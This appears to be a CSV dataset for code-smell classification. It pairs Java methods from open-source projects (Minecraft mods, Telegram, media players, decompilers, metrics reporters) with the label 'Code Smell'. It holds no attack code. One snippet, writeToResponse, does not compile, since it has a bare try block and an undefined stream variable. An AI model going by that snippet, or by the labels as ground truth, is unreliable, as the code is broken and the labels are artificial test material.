text,label,text_label
"public void sampleCenterDepth(){
  if ((hasFirstSample && (!everRetrieved)) || destroyed) {
    return;
  }
  hasFirstSample=true;
  this.framebuffer.bind();
  this.program.use();
  RenderSystem.viewport(0,0,1,1);
  FullScreenQuadRenderer.INSTANCE.render();
  ProgramUniforms.clearActiveUniforms();
  ProgramSamplers.clearActiveSamplers();
  DepthCopyStrategy.fastest(false).copy(this.framebuffer,texture,null,altTexture,1,1);
  Minecraft.getInstance().getMainRenderTarget().bindWrite(true);
}",1,Code Smell
"@Override public WFCMessage.PullMessageResult fetchChatroomMessage(String fromUser,String chatroomId,String exceptClientId,long fromMessageId){
  WFCMessage.PullMessageResult.Builder builder=WFCMessage.PullMessageResult.newBuilder();
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  IMap<Long,MessageBundle> mIMap=hzInstance.getMap(MESSAGES_MAP);
  long head=fromMessageId;
  long current=fromMessageId;
  TreeMap<Long,Long> maps=chatroomMessages.get(chatroomId);
  if (maps == null) {
    mWriteLock.lock();
    try {
      maps=chatroomMessages.get(chatroomId);
      if (maps == null) {
        maps=new TreeMap<>();
        chatroomMessages.put(chatroomId,maps);
      }
    }
  finally {
      mWriteLock.unlock();
    }
  }
  mReadLock.lock();
  int size=0;
  try {
    maps=chatroomMessages.get(chatroomId);
    while (true) {
      Map.Entry<Long,Long> entry=maps.higherEntry(current);
      if (entry == null) {
        break;
      }
      current=entry.getKey();
      long targetMessageId=entry.getValue();
      MessageBundle bundle=mIMap.get(targetMessageId);
      if (bundle != null) {
        if (exceptClientId == null || !exceptClientId.equals(bundle.getFromClientId()) || !fromUser.equals(bundle.getFromUser())) {
          if (bundle.getMessage().getContent().getExpireDuration() > 0) {
            if (System.currentTimeMillis() > bundle.getMessage().getServerTimestamp() + bundle.getMessage().getContent().getExpireDuration() * 1000) {
              continue;
            }
          }
          size+=bundle.getMessage().getSerializedSize();
          if (size >= 3 * 1024 * 1024) {
            break;
          }
          builder.addMessage(bundle.getMessage());
        }
      }
    }
    Map.Entry<Long,Long> lastEntry=maps.lastEntry();
    if (lastEntry != null) {
      head=lastEntry.getKey();
    }
  }
  finally {
    mReadLock.unlock();
  }
  builder.setCurrent(current);
  builder.setHead(head);
  return builder.build();
}",1,Code Smell
"@Override void onSelectedItemsCountChanged(int count){
  if (count <= 1 || parentAlert.editingMessageObject != null) {
    parentAlert.selectedMenuItem.hideSubItem(group);
    if (count == 0) {
      parentAlert.selectedMenuItem.showSubItem(open_in);
      parentAlert.selectedMenuItem.hideSubItem(compress);
    }
 else {
      parentAlert.selectedMenuItem.showSubItem(compress);
    }
  }
 else {
    parentAlert.selectedMenuItem.showSubItem(group);
  }
  if (count != 0) {
    parentAlert.selectedMenuItem.hideSubItem(open_in);
  }
  compressItem.setVisibility(documentsEnabled ? View.VISIBLE : View.GONE);
  if (count > 1) {
    parentAlert.selectedMenuItem.showSubItem(preview_gap);
    parentAlert.selectedMenuItem.showSubItem(preview);
    compressItem.setText(LocaleController.getString(R.string.SendAsFiles));
  }
 else {
    parentAlert.selectedMenuItem.hideSubItem(preview_gap);
    parentAlert.selectedMenuItem.hideSubItem(preview);
    if (count != 0) {
      compressItem.setText(LocaleController.getString(R.string.SendAsFile));
    }
  }
  if (count == 0 || parentAlert != null && parentAlert.baseFragment instanceof ChatActivity && ((ChatActivity)parentAlert.baseFragment).isSecretChat()) {
    spoilerItem.setText(LocaleController.getString(R.string.EnablePhotoSpoiler));
    spoilerItem.setAnimatedIcon(R.raw.photo_spoiler);
    parentAlert.selectedMenuItem.hideSubItem(spoiler);
  }
 else {
    parentAlert.selectedMenuItem.showSubItem(spoiler);
  }
}",1,Code Smell
"public void processClass(ClassNode root,ClassNode node){
  if (node.type == ClassNode.CLASS_LAMBDA && !node.lambdaInformation.is_method_reference) {
    ClassNode node_content=DecompilerContext.getClassProcessor().getMapRootClasses().get(node.classStruct.qualifiedName);
    if (node_content != null && node_content.getWrapper() != null) {
      node_content.getWrapper().getHiddenMembers().add(node.lambdaInformation.content_method_key);
    }
  }
  if (node.nested.isEmpty()) {
    return;
  }
  if (node.type != ClassNode.CLASS_LAMBDA) {
    computeLocalVarsAndDefinitions(node);
    checkNotFoundClasses(root,node);
  }
  int nameless=0, synthetics=0;
  for (  ClassNode child : node.nested) {
    StructClass cl=child.classStruct;
    if ((child.type == ClassNode.CLASS_LOCAL || child.type == ClassNode.CLASS_MEMBER) && child.simpleName == null) {
      if ((child.access & CodeConstants.ACC_SYNTHETIC) != 0 || cl.isSynthetic()) {
        child.simpleName=""SyntheticClass_"" + (++synthetics);
      }
 else {
        String message=""Nameless local or member class "" + cl.qualifiedName + ""!"";
        DecompilerContext.getLogger().writeMessage(message,IFernflowerLogger.Severity.WARN);
        child.simpleName=""NamelessClass_"" + (++nameless);
      }
    }
  }
  for (  ClassNode child : node.nested) {
    if (child.type == ClassNode.CLASS_LAMBDA) {
      setLambdaVars(node,child);
    }
 else     if (child.type != ClassNode.CLASS_MEMBER || (child.access & CodeConstants.ACC_STATIC) == 0) {
      insertLocalVars(node,child);
      if (child.type == ClassNode.CLASS_LOCAL && child.enclosingMethod != null) {
        MethodWrapper enclosingMethodWrapper=node.getWrapper().getMethods().getWithKey(child.enclosingMethod);
        if (enclosingMethodWrapper != null) {
          setLocalClassDefinition(enclosingMethodWrapper,child);
        }
      }
    }
  }
  for (  ClassNode child : node.nested) {
    processClass(root,child);
  }
}",1,Code Smell
"private void addCameraItemIfNeeded(List<BottomItemData> itemDataList){
  if (isSeatEnabled() && mConferenceState.userModel.getRole() == TUIRoomDefine.Role.GENERAL_USER && !mConferenceState.userModel.isOnSeat()) {
    return;
  }
  itemDataList.add(createCameraItem());
}
",1,Code Smell
"@OnlyIn(Dist.CLIENT) protected void tickAudio(WhistleSize size,boolean powered){
  if (!powered) {
    if (soundInstance != null) {
      soundInstance.fadeOut();
      soundInstance=null;
    }
    return;
  }
  float f=(float)Math.pow(2,-pitch / 12.0);
  boolean particle=level.getGameTime() % 8 == 0;
  Vec3 eyePosition=Minecraft.getInstance().cameraEntity.getEyePosition();
  float maxVolume=(float)Mth.clamp((64 - eyePosition.distanceTo(Vec3.atCenterOf(worldPosition))) / 64,0,1);
  if (soundInstance == null || soundInstance.isStopped() || soundInstance.getOctave() != size) {
    Minecraft.getInstance().getSoundManager().play(soundInstance=new WhistleSoundInstance(size,worldPosition));
    AllSoundEvents.WHISTLE_CHIFF.playAt(level,worldPosition,maxVolume * .175f,size == WhistleSize.SMALL ? f + .75f : f,false);
    particle=true;
  }
  soundInstance.keepAlive();
  soundInstance.setPitch(f);
  if (!particle)   return;
  Direction facing=getBlockState().getOptionalValue(WhistleBlock.FACING).orElse(Direction.SOUTH);
  float angle=180 + AngleHelper.horizontalAngle(facing);
  Vec3 sizeOffset=VecHelper.rotate(new Vec3(0,-0.4f,1 / 16f * size.ordinal()),angle,Axis.Y);
  Vec3 offset=VecHelper.rotate(new Vec3(0,1,0.75f),angle,Axis.Y);
  Vec3 v=offset.scale(.45f).add(sizeOffset).add(Vec3.atCenterOf(worldPosition));
  Vec3 m=offset.subtract(Vec3.atLowerCornerOf(facing.getNormal()).scale(.75f));
  level.addParticle(new SteamJetParticleData(1),v.x,v.y,v.z,m.x,m.y,m.z);
}",1,Code Smell
"private View.OnClickListener getMessageClickListener(final Wrapper<MESSAGE> wrapper){
  return new DebouncedOnClickListener(3_000){
    @Override public void onDebouncedClick(    View view){
      if (selectionListener != null && isSelectionModeEnabled) {
        wrapper.isSelected=!wrapper.isSelected;
        if (wrapper.isSelected)         incrementSelectedItemsCount();
 else         decrementSelectedItemsCount();
        MESSAGE message=(wrapper.item);
        notifyItemChanged(getMessagePositionById(message.getId()));
      }
 else {
        notifyMessageClicked(wrapper.item);
        notifyMessageViewClicked(view,wrapper.item);
      }
    }
  }
;
}",1,Code Smell
"public boolean isOutOwner(){
  if (preview) {
    return true;
  }
  if (isOutOwnerCached != null) {
    return isOutOwnerCached;
  }
  TLRPC.Chat chat=messageOwner.peer_id != null && messageOwner.peer_id.channel_id != 0 ? getChat(null,null,messageOwner.peer_id.channel_id) : null;
  if (!messageOwner.out || !(messageOwner.from_id instanceof TLRPC.TL_peerUser) && (!(messageOwner.from_id instanceof TLRPC.TL_peerChannel) || ChatObject.isChannel(chat) && !chat.megagroup) || messageOwner.post) {
    return isOutOwnerCached=false;
  }
  if (messageOwner.fwd_from == null) {
    return isOutOwnerCached=true;
  }
  long selfUserId=UserConfig.getInstance(currentAccount).getClientUserId();
  if (getDialogId() == selfUserId) {
    return isOutOwnerCached=messageOwner.fwd_from.from_id instanceof TLRPC.TL_peerUser && messageOwner.fwd_from.from_id.user_id == selfUserId && (messageOwner.fwd_from.saved_from_peer == null || messageOwner.fwd_from.saved_from_peer.user_id == selfUserId) || messageOwner.fwd_from.saved_from_peer != null && messageOwner.fwd_from.saved_from_peer.user_id == selfUserId && (messageOwner.fwd_from.from_id == null || messageOwner.fwd_from.from_id.user_id == selfUserId);
  }
  return isOutOwnerCached=messageOwner.fwd_from.saved_from_peer == null || messageOwner.fwd_from.saved_from_peer.user_id == selfUserId;
}",1,Code Smell
"@Override public J.ParameterizedType visitParameterizedType(J.ParameterizedType type,P p){
  J.ParameterizedType pt=super.visitParameterizedType(type,p);
  boolean spaceWithinAngleBrackets=style.getWithin().getAngleBrackets();
  if (pt.getPadding().getTypeParameters() != null) {
    pt=pt.getPadding().withTypeParameters(spaceBefore(pt.getPadding().getTypeParameters(),style.getTypeArguments().getBeforeOpeningAngleBracket()));
  }
  if (pt.getPadding().getTypeParameters() != null && !(pt.getPadding().getTypeParameters().getElements().isEmpty() || pt.getPadding().getTypeParameters().getElements().iterator().next() instanceof J.Empty)) {
    int typeParametersSize=pt.getPadding().getTypeParameters().getElements().size();
    pt=pt.getPadding().withTypeParameters(pt.getPadding().getTypeParameters().getPadding().withElements(ListUtils.map(pt.getPadding().getTypeParameters().getPadding().getElements(),(index,elemContainer) -> {
      if (index == 0) {
        elemContainer=elemContainer.withElement(spaceBefore(elemContainer.getElement(),spaceWithinAngleBrackets));
      }
 else {
        elemContainer=elemContainer.withElement(spaceBefore(elemContainer.getElement(),style.getTypeArguments().getAfterComma()));
      }
      if (index == typeParametersSize - 1) {
        elemContainer=spaceAfter(elemContainer,spaceWithinAngleBrackets);
      }
      return elemContainer;
    }
)));
  }
  return pt;
}",1,Code Smell
"public static String replaceDateExpression(Calendar dateTime,String dataPath){
  if (dataPath == null) {
    return null;
  }
  String year=String.valueOf(dateTime.get(Calendar.YEAR));
  String month=String.valueOf(dateTime.get(Calendar.MONTH) + 1);
  String day=String.valueOf(dateTime.get(Calendar.DAY_OF_MONTH));
  String hour=String.valueOf(dateTime.get(Calendar.HOUR_OF_DAY));
  String minute=String.valueOf(dateTime.get(Calendar.MINUTE));
  StringBuffer sb=new StringBuffer();
  ArrayList<MatchPoint> mp=extractAllTimeRegex(dataPath);
  if (mp == null || mp.size() == 0) {
    return dataPath;
  }
  int lastIndex=0;
  for (  MatchPoint m : mp) {
    sb.append(dataPath.substring(lastIndex,m.getStart()));
    String longestPattern=m.getStr();
    int hhIndex=longestPattern.indexOf(""hh"");
    int mmIndex=longestPattern.indexOf(""mm"");
    longestPattern=longestPattern.replaceAll(""YYYY"",year);
    longestPattern=longestPattern.replaceAll(""MM"",externDate(month));
    longestPattern=longestPattern.replaceAll(""DD"",externDate(day));
    longestPattern=longestPattern.replaceAll(""hh"",externDate(hour));
    if (hhIndex != -1 && mmIndex != -1 && mmIndex >= hhIndex + 2 && mmIndex < hhIndex + 4) {
      longestPattern=longestPattern.replaceAll(""mm"",externDate(minute));
    }
    sb.append(longestPattern);
    lastIndex=m.getEnd();
  }
  sb.append(dataPath.substring(lastIndex));
  return sb.toString();
}",1,Code Smell
"/** 
 * Sends telemetry information.
 * @param engine the default engine name
 */
public static void callHome(String engine){
  if (Utils.isOfflineMode() || Boolean.parseBoolean(Utils.getEnvOrSystemProperty(""OPT_OUT_TRACKING"")) || System.currentTimeMillis() - lastCheckIn < ONE_DAY) {
    return;
  }
  lastCheckIn=System.currentTimeMillis();
  String instanceId;
  String region;
  if (isSageMaker()) {
    instanceId=readEndpointMetadata(""ResourceId"");
    region=Utils.getenv(""AWS_REGION"");
  }
 else {
    instanceId=readMetadata(""instance-id"");
    region=readMetadata(""placement/region"");
  }
  if (instanceId == null || region == null || region.length() == 0) {
    return;
  }
  String url=""https://djl-telemetry-"" + region + "".s3.""+ region+ "".amazonaws.com/telemetry.txt?instance-id=""+ instanceId+ ""&version=""+ Engine.getDjlVersion()+ ""&engine=""+ engine;
  HttpURLConnection conn=null;
  try {
    conn=openConnection(new URL(url),""GET"",null,null);
    int statusCode=conn.getResponseCode();
    if (statusCode != HttpURLConnection.HTTP_OK) {
      logger.debug(""telemetry: {} {}"",statusCode,conn.getResponseMessage());
    }
 else {
      logger.info(""DJL will collect telemetry to help us better understand our users' needs,"" + "" diagnose issues, and deliver additional features. If you would like"" + "" to learn more or opt-out please go to:""+ "" https://docs.djl.ai/master/docs/telemetry.html for more""+ "" information."");
    }
  }
 catch (  IOException e) {
    logger.debug(""Failed call home."");
  }
 finally {
    if (conn != null) {
      conn.disconnect();
    }
  }
}",1,Code Smell
"/** 
 * 画底部文字
 * @param canvas
 * @param startX
 * @param endX
 * @param lineStartY
 * @param bottomTextPadding
 */
private void drawBottomText(@NonNull Canvas canvas,int startX,int endX,int lineStartY,float bottomTextPadding){
  if (textLayout != null) {
    if (tempErrorText != null || ((helperTextAlwaysShown || hasFocus()) && !TextUtils.isEmpty(helperText))) {
      textPaint.setColor(tempErrorText != null ? errorColor : helperTextColor != -1 ? helperTextColor : (baseColor & 0x00ffffff | 0x44000000));
      canvas.save();
      if (isRTL()) {
        canvas.translate(endX - textLayout.getWidth(),lineStartY + bottomSpacing - bottomTextPadding);
      }
 else {
        canvas.translate(startX + getBottomTextLeftOffset(),lineStartY + bottomSpacing - bottomTextPadding);
      }
      textLayout.draw(canvas);
      canvas.restore();
    }
  }
}",1,Code Smell
"@Override public J visitLambda(J.Lambda lambda,P ctx){
  J.Lambda l=(J.Lambda)super.visitLambda(lambda,ctx);
  if (getStyle().getLambda() && l.getParameters().getParameters().size() == 1 && l.getParameters().isParenthesized() && l.getParameters().getParameters().get(0) instanceof J.VariableDeclarations && ((J.VariableDeclarations)l.getParameters().getParameters().get(0)).getTypeExpression() == null) {
    l=l.withParameters(l.getParameters().withParenthesized(false));
  }
  return l;
}",1,Code Smell
"@NonNull @Override protected InteractionResult mobInteract(@NonNull Hand hand,@NonNull GeyserItemStack itemInHand){
  if (!canEat(itemInHand) && getFlag(EntityFlag.SADDLED) && passengers.isEmpty()&& !session.isSneaking()) {
    return InteractionResult.SUCCESS;
  }
 else {
    InteractionResult superResult=super.mobInteract(hand,itemInHand);
    if (superResult.consumesAction()) {
      return superResult;
    }
 else {
      return EntityUtils.attemptToSaddle(this,itemInHand);
    }
  }
}
",1,Code Smell
"@Override public void open(MetricConfig config){
  super.open(config);
  String host=config.getString(HOST.key(),HOST.defaultValue());
  int port=config.getInteger(PORT.key(),PORT.defaultValue());
  String clusterMode=config.getString(CLUSTER_MODE.key(),CLUSTER_MODE.defaultValue());
  String configuredJobName=config.getString(JOB_NAME.key(),JOB_NAME.defaultValue());
  boolean randomSuffix=config.getBoolean(RANDOM_JOB_NAME_SUFFIX.key(),RANDOM_JOB_NAME_SUFFIX.defaultValue());
  deleteOnShutdown=config.getBoolean(DELETE_ON_SHUTDOWN.key(),DELETE_ON_SHUTDOWN.defaultValue());
  groupingKey=parseGroupingKey(config.getString(GROUPING_KEY.key(),GROUPING_KEY.defaultValue()));
  if (host == null || host.isEmpty() || port < 1) {
    throw new IllegalArgumentException(""Invalid host/port configuration. Host: "" + host + "" Port: ""+ port);
  }
  Properties properties=System.getProperties();
  taskName=properties.getProperty(""taskName"",null);
  taskId=properties.getProperty(""taskId"",null);
  String jobNamePrefix="""";
  if (!StringUtils.isNullOrWhitespaceOnly(clusterMode) && clusterMode.toUpperCase().equals(ClusterMode.YARN.name())) {
    appId=System.getenv(""_APP_ID"");
    if (!StringUtils.isNullOrWhitespaceOnly(appId)) {
      jobNamePrefix=appId + ""_jobmanager"";
    }
 else {
      String pwd=System.getenv(""PWD"");
      String[] values=pwd.split(File.separator);
      String containerId="""";
      if (values.length >= 2) {
        appId=values[values.length - 2];
        containerId=values[values.length - 1];
      }
      jobNamePrefix=appId + ""_taskmanager_"" + containerId;
    }
  }
 else   if (!StringUtils.isNullOrWhitespaceOnly(clusterMode) && clusterMode.toUpperCase().equals(ClusterMode.K8S.name())) {
    Map<String,String> envs=System.getenv();
    appId=envs.get(""CLUSTER_ID"");
    if (""k8s"".equalsIgnoreCase(host)) {
      host=envs.get(""_HOST_IP_ADDRESS"");
      log.info(""the pod is on K8s cluster, the host ip is {}"",host);
    }
    if (appId != null) {
      String hostname=envs.get(""HOSTNAME"");
      if (hostname.contains(""taskmanager"")) {
        jobNamePrefix=appId + ""_taskmanager_"" + hostname;
      }
 else {
        jobNamePrefix=appId + ""_jobmanager"";
      }
    }
  }
 else {
    jobNamePrefix=configuredJobName;
  }
  if (randomSuffix) {
    this.jobName=jobNamePrefix + ""_"" + new AbstractID();
  }
 else {
    this.jobName=jobNamePrefix;
  }
  pushGateway=new PushGateway(host + ':' + port);
  log.info(""Configured PrometheusPushGatewayReporter with {host:{}, port:{}, jobName:{}, randomJobNameSuffix:{}, deleteOnShutdown:{}, groupingKey:{}}"",host,port,jobName,randomSuffix,deleteOnShutdown,groupingKey);
}",1,Code Smell
"/** 
 * Appends a sequence of items to the media queue. If no media queue exists, does nothing.
 * @param items The items to append.
 * @return The Cast {@code PendingResult}, or null if no media queue exists.
 */
@Nullable public PendingResult<MediaChannelResult> addItems(MediaQueueItem... items){
  return addItems(MediaQueueItem.INVALID_ITEM_ID,items);
}
/** 
 * Inserts a sequence of items into the media queue. If no media queue or period with id  {@code periodId} exist, does nothing.
 * @param periodId The id of the period ({@link #getCurrentTimeline}) that corresponds to the item that will follow immediately after the inserted items.
 * @param items The items to insert.
 * @return The Cast {@code PendingResult}, or null if no media queue or no period with id  {@code periodId} exist.
 */
@Nullable public PendingResult<MediaChannelResult> addItems(int periodId,MediaQueueItem... items){
  if (getMediaStatus() != null && (periodId == MediaQueueItem.INVALID_ITEM_ID || currentTimeline.getIndexOfPeriod(periodId) != C.INDEX_UNSET)) {
    return remoteMediaClient.queueInsertItems(items,periodId,null);
  }
  return null;
}
",1,Code Smell
"public void setLabelOrientation(View view,int orientation){
  if (mOrientation != orientation && orientation <= RIGHT_BOTTOM && orientation >= LEFT_TOP) {
    mOrientation=orientation;
    view.invalidate();
  }
}
",1,Code Smell
"@Override protected PluginDescriptor createPluginDescriptor(Manifest manifest){
  JdbcDriverPluginDescriptor pluginDescriptor=this.createJdbcDriverPluginDescriptorInstance();
  Attributes attributes=manifest.getMainAttributes();
  String id=driverClass;
  pluginDescriptor.setPluginId(id.split(""\n"")[0]);
  if (StringUtils.isBlank(id)) {
    return null;
  }
  String description=attributes.getValue(""Plugin-Description"");
  if (StringUtils.isBlank(description)) {
    pluginDescriptor.setPluginDescription("""");
  }
 else {
    pluginDescriptor.setPluginDescription(description);
  }
  String version=attributes.getValue(""Implementation-Version"");
  if (StringUtils.isNotBlank(version)) {
    pluginDescriptor.setPluginVersion(version);
  }
 else {
    for (    Object key : attributes.keySet()) {
      Object var=attributes.get(key);
      if (key != null && var != null && StringUtils.containsIgnoreCase(key.toString(),""Version"")) {
        pluginDescriptor.setPluginVersion(var.toString());
        break;
      }
    }
  }
  if (StringUtils.isBlank(version)) {
    pluginDescriptor.setPluginVersion(id);
  }
  String provider=attributes.getValue(""Implementation-Vendor"");
  pluginDescriptor.setProvider(provider);
  return pluginDescriptor;
}",1,Code Smell
"@Override public T get(int position){
  if (mItems != null && position >= 0 && position <= mItems.size() - 1) {
    return mItems.get(position);
  }
 else {
    return null;
  }
}",1,Code Smell
"public static void reloadDebugState(){
  if (Iris.getIrisConfig().areDebugOptionsEnabled() && (GL.getCapabilities().GL_KHR_debug || GL.getCapabilities().OpenGL43)) {
    debugState=new KHRDebugState();
  }
 else {
    debugState=new UnsupportedDebugState();
  }
}",1,Code Smell
"@Override public <T>LazyOptional<T> getCapability(Capability<T> cap,Direction side){
  if (isFluidHandlerCap(cap) && (side == null || HosePulleyBlock.hasPipeTowards(level,worldPosition,getBlockState(),side)))   return this.capability.cast();
  return super.getCapability(cap,side);
}
",1,Code Smell
"@Override public boolean onInterceptTouchEvent(final MotionEvent me){
  if (isInlineAutofillSuggestionsVisible) {
    return false;
  }
  if (!mMoreSuggestionsView.isShowingInParent()) {
    mLastX=(int)me.getX();
    mLastY=(int)me.getY();
    return mMoreSuggestionsSlidingDetector.onTouchEvent(me);
  }
  if (mMoreSuggestionsView.isInModalMode()) {
    return false;
  }
  final int action=me.getAction();
  final int index=me.getActionIndex();
  final int x=(int)me.getX(index);
  final int y=(int)me.getY(index);
  if (Math.abs(x - mOriginX) >= mMoreSuggestionsModalTolerance || mOriginY - y >= mMoreSuggestionsModalTolerance) {
    mNeedsToTransformTouchEventToHoverEvent=AccessibilityUtils.Companion.getInstance().isTouchExplorationEnabled();
    mIsDispatchingHoverEventToMoreSuggestions=false;
    return true;
  }
  if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_POINTER_UP) {
    mMoreSuggestionsView.setModalMode();
  }
  return false;
}
",1,Code Smell
"private SpelNodeImpl eatStartNode(){
  if (maybeEatLiteral()) {
    return pop();
  }
 else   if (maybeEatParenExpression()) {
    return pop();
  }
 else   if (maybeEatTypeReference() || maybeEatNullReference() || maybeEatConstructorReference()|| maybeEatMethodOrProperty(false)|| maybeEatFunctionOrVar()) {
    return pop();
  }
 else   if (maybeEatBeanReference()) {
    return pop();
  }
 else   if (maybeEatProjection(false) || maybeEatSelection(false) || maybeEatIndexer()) {
    return pop();
  }
 else   if (maybeEatInlineListOrMap()) {
    return pop();
  }
 else {
    return null;
  }
}
",1,Code Smell
"private static void liftConstructor(ClassWrapper wrapper){
  for (  MethodWrapper method : wrapper.getMethods()) {
    if (CodeConstants.INIT_NAME.equals(method.methodStruct.getName()) && method.root != null) {
      Statement firstData=Statements.findFirstData(method.root);
      if (firstData == null) {
        return;
      }
      int index=0;
      List<Exprent> lstExprents=firstData.getExprents();
      for (      Exprent exprent : lstExprents) {
        int action=0;
        if (exprent.type == Exprent.EXPRENT_ASSIGNMENT) {
          AssignmentExprent assignExpr=(AssignmentExprent)exprent;
          if (assignExpr.getLeft().type == Exprent.EXPRENT_FIELD && assignExpr.getRight().type == Exprent.EXPRENT_VAR) {
            FieldExprent fExpr=(FieldExprent)assignExpr.getLeft();
            if (fExpr.getClassname().equals(wrapper.getClassStruct().qualifiedName)) {
              StructField structField=wrapper.getClassStruct().getField(fExpr.getName(),fExpr.getDescriptor().descriptorString);
              if (structField != null && structField.hasModifier(CodeConstants.ACC_FINAL)) {
                action=1;
              }
            }
          }
        }
 else         if (index > 0 && exprent.type == Exprent.EXPRENT_INVOCATION && Statements.isInvocationInitConstructor((InvocationExprent)exprent,method,wrapper,true)) {
          lstExprents.add(0,lstExprents.remove(index));
          action=2;
        }
        if (action != 1) {
          break;
        }
        index++;
      }
    }
  }
}",1,Code Smell
"private void writeToResponse(CompressedInputStream data,HttpResponse response,HttpRequest request) throws IOException {
  Compression compression=data.getCompression();
  if (compression != Compression.NONE && request.hasHeaderValue(""Accept-Encoding"",compression.getId())) {
    response.addHeader(""Content-Encoding"",compression.getId());
    response.setData(data);
  }
 else   if (compression != Compression.GZIP && !response.hasHeaderValue(""Content-Type"",""image/png"") && request.hasHeaderValue(""Accept-Encoding"",Compression.GZIP.getId())) {
    response.addHeader(""Content-Encoding"",Compression.GZIP.getId());
    ByteArrayOutputStream byteOut=new ByteArrayOutputStream();
    try {
      data.decompress().transferTo(os);
    }
     byte[] compressedData=byteOut.toByteArray();
    response.setData(new ByteArrayInputStream(compressedData));
  }
 else {
    response.setData(data.decompress());
  }
}
",1,Code Smell
"@Nullable private static SchemeData parseDrmSchemeData(String line,String keyFormat,Map<String,String> variableDefinitions) throws ParserException {
  String keyFormatVersions=parseOptionalStringAttr(line,REGEX_KEYFORMATVERSIONS,""1"",variableDefinitions);
  if (KEYFORMAT_WIDEVINE_PSSH_BINARY.equals(keyFormat)) {
    String uriString=parseStringAttr(line,REGEX_URI,variableDefinitions);
    return new SchemeData(C.WIDEVINE_UUID,MimeTypes.VIDEO_MP4,Base64.decode(uriString.substring(uriString.indexOf(',')),Base64.DEFAULT));
  }
 else   if (KEYFORMAT_WIDEVINE_PSSH_JSON.equals(keyFormat)) {
    return new SchemeData(C.WIDEVINE_UUID,""hls"",Util.getUtf8Bytes(line));
  }
 else   if (KEYFORMAT_PLAYREADY.equals(keyFormat) && ""1"".equals(keyFormatVersions)) {
    String uriString=parseStringAttr(line,REGEX_URI,variableDefinitions);
    byte[] data=Base64.decode(uriString.substring(uriString.indexOf(',')),Base64.DEFAULT);
    byte[] psshData=PsshAtomUtil.buildPsshAtom(C.PLAYREADY_UUID,data);
    return new SchemeData(C.PLAYREADY_UUID,MimeTypes.VIDEO_MP4,psshData);
  }
  return null;
}",1,Code Smell
"@Override public BlockState getStateForPlacement(BlockPlaceContext context){
  Axis preferredAxis=RotatedPillarKineticBlock.getPreferredAxis(context);
  if (preferredAxis != null && (context.getPlayer() == null || !context.getPlayer().isShiftKeyDown()))   return withAxis(preferredAxis,context);
  return withAxis(context.getNearestLookingDirection().getAxis(),context);
}
",1,Code Smell
"public static boolean isOpenEnd(BlockGetter reader,BlockPos pos,Direction side){
  BlockPos connectedPos=pos.relative(side);
  BlockState connectedState=reader.getBlockState(connectedPos);
  FluidTransportBehaviour pipe=FluidPropagator.getPipe(reader,connectedPos);
  if (pipe != null && pipe.canHaveFlowToward(connectedState,side.getOpposite()))   return false;
  if (PumpBlock.isPump(connectedState) && connectedState.getValue(PumpBlock.FACING).getAxis() == side.getAxis())   return false;
  if (VanillaFluidTargets.canProvideFluidWithoutCapability(connectedState))   return true;
  if (BlockHelper.hasBlockSolidSide(connectedState,reader,connectedPos,side.getOpposite()) && !AllBlockTags.FAN_TRANSPARENT.matches(connectedState))   return false;
  if (hasFluidCapability(reader,connectedPos,side.getOpposite()))   return false;
  if (!(connectedState.canBeReplaced() && connectedState.getDestroySpeed(reader,connectedPos) != -1) && !connectedState.hasProperty(BlockStateProperties.WATERLOGGED))   return false;
  return true;
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  try {
    if (!allScreenRotations)     return;
    final int lastRotation=(int)param.args[1];
    if (getIntField(param.thisObject,""mUserRotationMode"") == USER_ROTATION_LOCKED) {
      param.setResult(lastRotation);
      return;
    }
    Object mOrientationListener=getObjectField(param.thisObject,""mOrientationListener"");
    int sensorRotation=mOrientationListener != null ? (int)callMethod(mOrientationListener,""getProposedRotation"") : -1;
    if (sensorRotation < 0) {
      sensorRotation=lastRotation;
    }
    param.setResult(sensorRotation);
  }
 catch (  Throwable ignored) {
  }
}",1,Code Smell
